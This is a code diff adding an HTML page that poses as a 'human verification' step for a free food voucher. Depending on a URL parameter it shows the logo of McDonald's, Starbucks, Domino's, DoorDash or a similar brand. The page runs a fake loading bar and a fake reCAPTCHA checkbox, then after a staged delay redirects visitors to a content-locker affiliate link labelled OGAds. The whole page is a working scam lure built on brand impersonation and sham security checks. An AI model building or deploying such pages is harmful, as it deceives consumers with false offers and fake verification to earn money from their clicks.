@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Human Verification | FoodSaver USA</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .check-box { width: 28px; height: 28px; border: 2px solid #cbd5e1; border-radius: 6px; display: inline-block; position: relative; cursor: pointer; transition: 0.2s; }
+        .check-box.active { border-color: #2563eb; background-color: #eff6ff; }
+        .check-box.active::after { content: '✓'; position: absolute; left: 6px; top: -2px; color: #2563eb; font-weight: bold; font-size: 20px; }
+        
+        #redirect-loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.98); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
+        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #2563eb; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body class="bg-slate-100 flex items-center justify-center min-h-screen p-4 font-sans">
+
+    <!-- 3-Second Redirect Loader -->
+    <div id="redirect-loader">
+        <div class="spinner mb-4"></div>
+        <h2 class="text-xl font-black text-slate-900 uppercase tracking-tight">Generating Secure Offer...</h2>
+        <p class="text-slate-500 text-sm animate-pulse">Please do not refresh this page.</p>
+    </div>
+
+    <div class="max-w-md w-full bg-white rounded-[2.5rem] p-8 shadow-2xl border border-slate-200 relative">
+        <div class="absolute top-0 left-0 right-0 bg-blue-600 py-1 text-[10px] text-white text-center font-bold uppercase tracking-widest rounded-t-[2.5rem]">
+            Secure Verification Server
+        </div>
+
+        <!-- Dynamic Logo -->
+        <div class="mt-4 mb-8 flex justify-center">
+            <img id="brand-logo" src="" alt="Logo" class="h-20 object-contain">
+        </div>
+
+        <!-- Initial Verification Loading -->
+        <div id="loading-section">
+            <h2 class="text-xl font-black text-center text-slate-800 mb-4 uppercase">Verifying Request...</h2>
+            <div class="w-full bg-slate-100 h-3 rounded-full mb-4 overflow-hidden border border-slate-200">
+                <div id="bar" class="h-full bg-blue-600 w-0 transition-all duration-300"></div>
+            </div>
+            <p id="status-text" class="text-center text-[10px] font-black text-slate-400 uppercase tracking-[0.2em]">Checking Region...</p>
+        </div>
+
+        <!-- Human Verification Box -->
+        <div id="verification-box" class="hidden animate-in fade-in zoom-in duration-500">
+            <div class="text-center mb-8">
+                <h2 class="text-2xl font-black text-slate-900 tracking-tight uppercase">Are you human?</h2>
+                <p class="text-slate-500 text-sm mt-2 font-medium">Verification required to release your <span id="brand-name-text"></span> voucher.</p>
+            </div>
+
+            <!-- CAPTCHA Box -->
+            <div class="border border-slate-200 rounded-2xl p-6 bg-slate-50 mb-6 flex items-center justify-between shadow-sm">
+                <div class="flex items-center gap-4">
+                    <div id="captcha-check" class="check-box bg-white" onclick="enableButton()"></div>
+                    <span class="font-bold text-slate-700 text-sm">I am not a robot</span>
+                </div>
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/512px-RecaptchaLogo.svg.png" class="h-8 opacity-40" alt="reCAPTCHA">
+            </div>
+
+            <!-- Redirect Button -->
+            <button onclick="startRedirect()" id="verify-btn" 
+               class="hidden w-full text-white font-black py-5 rounded-2xl text-center shadow-xl transition-all text-lg uppercase tracking-wider">
+                Verify & Unlock Code
+            </button>
+        </div>
+    </div>
+
+    <script>
+        const brandData = {
+            mcdonalds: { logo: "https://s7d1.scene7.com/is/image/mcdonalds/History_Timeline_1968_Thumbnail-1:3-column-desktop?resmode=sharp2", color: "#FFBC0D" },
+            starbucks: { logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQL9qng8NaVsuYBhJBJx-8fihW_Ryp2QoaDhg&s", color: "#00704A" },
+            pizzahut: { logo: "https://upload.wikimedia.org/wikipedia/commons/c/c5/Pizza_Hut_2025.svg", color: "#EE3124" },
+            dominos: { logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/7/74/Dominos_pizza_logo.svg/960px-Dominos_pizza_logo.svg.png", color: "#006491" },
+            burgerking: { logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcROKwsYGYdAcYcP7PXZOFgnG0t1rkcVMbET4g&s", color: "#F5EBDC" },
+            doordash: { logo: "https://images.ctfassets.net/trvmqu12jq2l/1fl1jUAiV8AB4npGwVLUK6/7e111f1db742182cb3b0e980da1c1b8d/doordash-logo-0.png", color: "#FF3008" }
+        };
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const brandKey = urlParams.get('brand') || 'mcdonalds';
+        const brand = brandData[brandKey] || brandData.mcdonalds;
+
+        document.getElementById('brand-logo').src = brand.logo;
+        document.getElementById('brand-name-text').innerText = brandKey.toUpperCase();
+        const verifyBtn = document.getElementById('verify-btn');
+        verifyBtn.style.backgroundColor = brand.color;
+        if(brandKey === 'mcdonalds' || brandKey === 'burgerking') verifyBtn.style.color = '#000';
+
+        // Fake Loading Bar
+        let i = 0;
+        let loader = setInterval(() => {
+            i += Math.random() * 20;
+            if(i >= 100) {
+                i = 100;
+                clearInterval(loader);
+                setTimeout(() => {
+                    document.getElementById('loading-section').classList.add('hidden');
+                    document.getElementById('verification-box').classList.remove('hidden');
+                }, 500);
+            }
+            document.getElementById('bar').style.width = i + "%";
+        }, 500);
+
+        function enableButton() {
+            document.getElementById('captcha-check').classList.add('active');
+            setTimeout(() => { document.getElementById('verify-btn').classList.remove('hidden'); }, 300);
+        }
+
+        // Final Redirect to OGAds (3 Seconds)
+        function startRedirect() {
+            document.getElementById('redirect-loader').style.display = 'flex';
+            setTimeout(() => {
+                window.location.href = "https://appsave.space/cl/i/pqrro4";
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
